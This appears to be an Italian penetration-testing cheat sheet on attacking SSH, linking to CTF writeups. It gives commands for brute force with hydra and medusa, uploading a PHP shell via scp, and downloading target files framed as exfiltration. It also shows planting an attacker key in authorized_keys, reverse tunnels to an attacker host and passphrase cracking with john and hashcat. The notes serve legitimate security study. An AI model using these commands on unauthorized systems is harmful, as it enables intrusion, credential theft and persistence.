#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Bruteforce]]
- [[#Upload File]]
- [[#Download File]]
- [[#Accesso Chiave Privata]]
- [[#Creazione Chiave Privata]]
- [[#Port Forwarding / Tunneling]]
- [[#Passphrase Cracking]]
- [[#Fake SSH]]
- [[#File di Configurazione]]

---
--- 
---
### Introduzione
*SSH (Secure Shell)* Ã¨ un protocollo di rete criptato utilizzato per amministrare sistemi remoti in modo sicuro tramite riga di comando. Opera di default sulla porta TCP/22 e offre un accesso diretto al sistema operativo, solitamente con privilegi elevati.
Per un attaccante, ottenere lâ€™accesso a un servizio SSH equivale a compromettere direttamente il sistema, motivo per cui rappresenta uno degli obiettivi piÃ¹ critici durante un penetration test.

---
### Bruteforce
Per un bruteforce Ã¨ sempre consigliato prima effettuare delle tecniche di [[User Enumeration]]:

```
hydra -U users.txt -P ./rockyou.txt ssh://IP
```

```
medusa -h target.com -u admin -P passwords.txt -M ssh
```

Di seguito alcuni writeups d'esempio:
- *Linux:*[[Linux#Beep#Exploit 2| Beep]],[[Linux#FunBoxEasy| FunBoxEasy]],[[Linux#Node| Node]],
- *Windows:*[[Windows#ServerMon| ServerMon]],

---
### Upload File
Una volta ottenuto lâ€™accesso SSH o disponendo delle credenziali/chiavi corrette, Ã¨ possibile trasferire file tra la macchina dellâ€™attaccante e il target usando protocolli cifrati come SCP, SFTP:

```
scp file.txt user@target.com:/tmp/ #Copia singolo file
```

```
scp -r myfolder/ user@target.com:/var/www/ #Copia intera directory
```

```
scp -P 2222 shell.php user@target.com:/var/www/html/ #Specificare porta diversa
```

Di seguito alcuni writeups d'esempio:
- *Linux:*[[Linux#Sorcerer| Sorcerer]],
  
  ---
### Download File
Una volta ottenuto lâ€™accesso SSH al sistema target, Ã¨ possibile **scaricare file o directory dal target verso la macchina dellâ€™attaccante** utilizzando protocolli cifrati come **SCP** o **SFTP**. Questa operazione Ã¨ utile, ad esempio, per **esfiltrare file di configurazione, backup, log o output di comandi** a fini di analisi offline.

Scaricare singolo file dal target:

```
scp user@target.com:/<RPATH> ./<LPATH>
```

Scaricare una intera directory:

```
scp -r user@target.com:/<RPATH> ./<LPATH>
```

---
### Accesso Chiave Privata
Se si ottiene una chiave privata (es: `id_rsa`) allora si puÃ² tentare l'accesso:

```
chmod 600 id_rsa
ssh -i id_rsa USER@TARGET
```

Di seguito alcuni writeups d'esempio:
- *Linux:*[[Linux#Passage| Passage]],[[Linux#Clue| Clue]],[[Linux#Luane| Luane]],[[Linux#Valentine| Valentine]],[[Linux#Forge| Forge]],[[Linux#Nineveh| Nineveh]],[[Linux#Pit| Pit]],

---
### Creazione Chiave Privata
Se si accesso ad un utente presente sulla macchina target, si puÃ² creare all'interno della sua directory il file `~/.ssh/authorized_keys` ed inserire una chiave pubblica in possesso dell'attaccante. Per la creazione della chiave utilizziamo:

```
ssh-keygen -f id_rsa
```

Di seguito alcuni writeups d'esempio:
- *Linux:*[[Linux#Passage| Passage]],[[Linux#Postman| Postman]],[[Linux#Amaterasu| Amaterasu]],[[Linux#Pit| Pit]],[[Linux#Sync| Sync]],

---
### Port Forwarding / Tunneling
Puoi usare SSH per creare[[ðŸ”¡ Glossario#Port Forwading / Tunneling| tunnelÂ°]] verso porte interne o per bypassare firewall (od in alternativa si puÃ² usare [chisel](https://github.com/jpillora/chisel)):

```
ssh -L 8080:localhost:80 user@target.com` #Locale
```

```
ssh -R 9000:127.0.0.1:22 attacker@kali.com` #Remoto
```

```
ssh -L5901:127.0.0.1:5901 -oKexAlgorithms=+diffie-hellman-group1-sha1 attacker@server.com
```

Di seguito alcuni writeups d'esempio:
- *Linux:*[[Linux#Nukem| Nukem]],[[Linux#Internal| Internal]],[[Linux#Vmdak| Vmdak]],[[Linux#Poison| Poison]],
- *Windows:*[[Windows#ServerMon| ServerMon]],

---
### Passphrase Cracking
Se ottieni una chiave privata SSH (`id_rsa`) ma Ã¨ protetta da passphrase, il file Ã¨ inutilizzabile fino a quando non viene decrittato. Craccare la passphrase ti permette di eseguire SSH come un utente legittimo, mantenendo lâ€™accesso anche dopo il cambio di password.

```
ssh2john id_rsa > hash.txt #Conversione chiave privata
john --wordlist=rockyou.txt hash.txt #Cracking
```

```
hashcat -m 22900 hash.txt rockyou.txt
```

Di seguito alcuni writeups d'esempio:
- *Linux:*[[Linux#Traverxec| Traverxec]],[[Linux#OpenAdmin]],[[Linux#Postman| Postman]],[[Linux#Scrutiny| Scrutiny]],

---
### Fake SSH
*FakeSSH* Ã¨ un honeypot (o fake service) che simula un server SSH, ma in realtÃ  non offre accesso shell reale. Il suo scopo Ã¨ registrare, analizzare o bloccare connessioni sospette o malevole, come quelle provenienti da bot, scanner automatici o attaccanti reali.
FakeSSH puÃ² *loggare username/password* inserite:

Writeup:
- *Active Directory:* [Sweep](https://medium.com/@bericontraster/sweep-vulnlab-full-walkthrough-tjnull-list-994dd099c5e0)

---
### File di Configurazione

```
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```


